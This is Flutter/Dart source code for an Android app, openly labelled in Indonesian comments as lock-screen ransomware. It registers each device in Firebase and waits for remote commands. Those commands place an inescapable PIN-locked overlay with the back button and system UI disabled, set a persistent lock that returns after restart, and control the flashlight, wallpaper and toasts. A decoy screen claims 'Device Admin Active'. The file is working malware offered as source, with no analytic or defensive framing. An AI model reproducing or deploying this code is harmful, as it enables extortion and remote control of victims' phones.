import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_windowmanager/flutter_windowmanager.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:torch_control/torch_control.dart';
import 'package:wallpaper_setter/wallpaper_setter.dart';
import 'package:flutter_toasty/flutter_toasty.dart';
import 'package:http/http.dart' as http;
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'firebase_options.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Inisialisasi Firebase dengan konfigurasi Android saja
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.android,
  );

  // Minta izin yang diperlukan
  await [
    Permission.camera,
    Permission.flashlight,
    Permission.storage,
    Permission.systemAlertWindow,
  ].request();

  // Cek apakah perangkat pernah terkunci sebelumnya (lock screen ransomware)
  await LockScreenService.checkPreviousLock();

  // Mulai mendengarkan perintah dari Firebase
  await CommandListener.start();

  runApp(const PayloadApp());
}

// ==================== LOCK SCREEN RANSOMWARE ====================
class LockScreenService {
  static OverlayEntry? _overlayEntry;
  static bool isLocked = false;

  static Future<void> showLockScreen(String message, String requiredPin) async {
    if (isLocked) return;
    isLocked = true;

    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('lock_pin', requiredPin);
    await prefs.setString('lock_message', message);
    await prefs.setBool('is_locked', true);

    _showFlutterOverlay(message, requiredPin);
  }

  static void _showFlutterOverlay(String message, String pin) {
    final overlay = OverlayEntry(
      builder: (context) => LockScreenWidget(
        message: message,
        requiredPin: pin,
        onUnlock: () {
          _overlayEntry?.remove();
          _overlayEntry = null;
          isLocked = false;
          clearLockState();
        },
      ),
    );
    _overlayEntry = overlay;
    final navigatorState = navigatorKey.currentState;
    if (navigatorState != null && navigatorState.context != null) {
      Overlay.of(navigatorState.context!).insert(overlay);
    }
  }

  static Future<void> checkPreviousLock() async {
    final prefs = await SharedPreferences.getInstance();
    bool locked = prefs.getBool('is_locked') ?? false;
    if (locked) {
      String pin = prefs.getString('lock_pin') ?? '1234';
      String msg = prefs.getString('lock_message') ?? '⚠️ DEVICE TERKUNCI ⚠️\nHubungi admin untuk membuka.';
      await showLockScreen(msg, pin);
    }
  }

  static Future<void> clearLockState() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove('is_locked');
    await prefs.remove('lock_pin');
    await prefs.remove('lock_message');
  }
}

class LockScreenWidget extends StatefulWidget {
  final String message;
  final String requiredPin;
  final VoidCallback onUnlock;
  const LockScreenWidget({required this.message, required this.requiredPin, required this.onUnlock});

  @override
  _LockScreenWidgetState createState() => _LockScreenWidgetState();
}

class _LockScreenWidgetState extends State<LockScreenWidget> {
  final TextEditingController pinController = TextEditingController();
  String errorMsg = '';

  @override
  void initState() {
    super.initState();
    // Sembunyikan system UI, kunci orientasi, dan aktifkan FLAG_SECURE
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.manual, overlays: []);
    SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
    if (Platform.isAndroid) {
      FlutterWindowManager.addFlags(FlutterWindowManager.FLAG_SECURE);
    }
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () async => false, // nonaktifkan tombol back
      child: Material(
        color: Colors.black,
        child: Center(
          child: Container(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Icon(Icons.lock_outline, size: 80, color: Colors.red),
                const SizedBox(height: 24),
                Text(
                  widget.message,
                  style: const TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 32),
                TextField(
                  controller: pinController,
                  obscureText: true,
                  style: const TextStyle(color: Colors.white),
                  decoration: InputDecoration(
                    hintText: 'Masukkan PIN',
                    hintStyle: const TextStyle(color: Colors.grey),
                    border: const OutlineInputBorder(borderSide: BorderSide(color: Colors.red)),
                    errorText: errorMsg.isEmpty ? null : errorMsg,
                  ),
                ),
                const SizedBox(height: 24),
                ElevatedButton(
                  onPressed: validatePin,
                  child: const Text('BUKA KUNCI'),
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void validatePin() async {
    if (pinController.text == widget.requiredPin) {
      widget.onUnlock();
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
      SystemChrome.setPreferredOrientations([]);
      Navigator.of(context).popUntil((route) => route.isFirst);
    } else {
      setState(() => errorMsg = 'PIN salah!');
      pinController.clear();
    }
  }
}

final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();

// ==================== COMMAND LISTENER (FIREBASE) ====================
class CommandListener {
  static DatabaseReference ref = FirebaseDatabase.instance.ref();
  static String deviceId = '';

  static Future<void> start() async {
    final prefs = await SharedPreferences.getInstance();
    deviceId = prefs.getString('device_id') ?? 'android_${DateTime.now().millisecondsSinceEpoch}';
    await prefs.setString('device_id', deviceId);

    // Tandai perangkat online di Firebase
    await ref.child('devices/$deviceId').set({
      'online': true,
      'last_seen': DateTime.now().toIso8601String(),
      'model': Platform.operatingSystem,
    });

    // Dengarkan perintah masuk
    ref.child('commands/$deviceId').onValue.listen((event) {
      if (event.snapshot.value != null) {
        final cmd = Map<String, dynamic>.from(event.snapshot.value as Map);
        _executeCommand(cmd['command'], cmd['params'] ?? {});
        ref.child('commands/$deviceId').remove();
      }
    });

    // Keep-alive: update status setiap 30 detik
    Timer.periodic(const Duration(seconds: 30), (_) async {
      await ref.child('devices/$deviceId/online').set(true);
      await ref.child('devices/$deviceId/last_seen').set(DateTime.now().toIso8601String());
    });
  }

  static Future<void> _executeCommand(String command, Map<String, dynamic> params) async {
    switch (command) {
      case 'flash_on':
        await TorchControl.turnOn();
        break;
      case 'flash_off':
        await TorchControl.turnOff();
        break;
      case 'lock_screen':
        String text = params['text'] ?? '⚠️ DEVICE TERKUNCI ⚠️\nHubungi admin.';
        String pin = params['pin']?.toString() ?? '0000';
        await LockScreenService.showLockScreen(text, pin);
        break;
      case 'set_wallpaper':
        final url = params['url'] as String?;
        if (url != null && url.isNotEmpty) await _setWallpaper(url);
        break;
      case 'toast':
        final msg = params['message'] as String?;
        if (msg != null && msg.isNotEmpty) {
          FlutterToasty.showToast(msg: msg, toastLength: Toast.LENGTH_SHORT);
        }
        break;
      case 'activate_admin':
        await Permission.systemAlertWindow.request();
        break;
    }
  }

  static Future<void> _setWallpaper(String url) async {
    try {
      final response = await http.get(Uri.parse(url));
      if (response.statusCode == 200) {
        final tempDir = Directory.systemTemp;
        final file = File('${tempDir.path}/wallpaper.jpg');
        await file.writeAsBytes(response.bodyBytes);
        await WallpaperSetter.setWallpaperFromFile(file.path, WallpaperLocation.homeScreen);
        await file.delete();
      }
    } catch (e) {
      // Abaikan error
    }
  }
}

// ==================== MAIN APP ====================
class PayloadApp extends StatelessWidget {
  const PayloadApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      navigatorKey: navigatorKey,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.security, size: 80, color: Colors.grey),
              const SizedBox(height: 20),
              const Text('System Running', style: TextStyle(color: Colors.white, fontSize: 18)),
              const Text('Device Admin Active', style: TextStyle(color: Colors.green)),
            ],
          ),
        ),
      ),
    );
  }
}